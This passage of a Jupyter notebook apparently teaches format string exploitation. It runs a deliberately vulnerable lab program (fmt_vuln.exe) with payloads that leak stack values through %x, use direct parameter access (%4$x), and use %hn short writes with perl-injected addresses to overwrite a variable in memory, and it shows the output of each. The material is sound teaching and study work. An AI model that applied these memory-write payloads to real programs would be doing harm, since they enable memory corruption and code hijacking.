      "/tmp/tmpga_vbkob.c:3:12: warning: unused arguments in $-style format [-Wformat-extra-args]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "7th: 70, 4th: 00040\n"
     ]
    }
   ],
   "source": [
    "#include <stdio.h>\n",
    "int main() {\n",
    "    printf(\"7th: %7$d, 4th: %4$05d\\n\", 10, 20, 30, 40, 50, 60, 70, 80);\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%x%x%x%x\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAAbfffe8400b7fff85841414141\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# lets use direct parameter access with fmt_vuln.exe\n",
    "! ./fmt_vuln.exe AAAA%x%x%x%x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%4$x\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAA41414141\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# access the fourth argument (beginning of the format string)\n",
    "# $ sign is special character so must be escaped\n",
    "! ./fmt_vuln.exe AAAA%4\\$x"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Using Short Writes\n",
    "- a `short` is typically a two-byte word using `h`\n",
    "- helps write an entire four-byte value with just two `%hn` parameters "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x%x%x%hn\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bbfffe8400b7fff858\r\n",
      "[*] test_val @ 0x0804a02c = -65515 0xffff0015\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x%x%x%hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ".�\u0004\b%4$hn\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ".�\u0004\b\r\n",
      "[*] test_val @ 0x0804a02c = 327608 0x0004ffb8\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2e\\xa0\\x04\\x08\"')%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
